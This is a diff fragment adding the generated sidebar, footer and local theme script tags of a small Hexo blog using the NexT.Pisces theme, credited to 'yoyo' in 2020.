+  <div class="site-description" itemprop="description">Hello!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      博客链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yoyo2tong.xyz/" title="http:&#x2F;&#x2F;www.yoyo2tong.xyz&#x2F;">myblog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yoyo</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">26k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">24 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
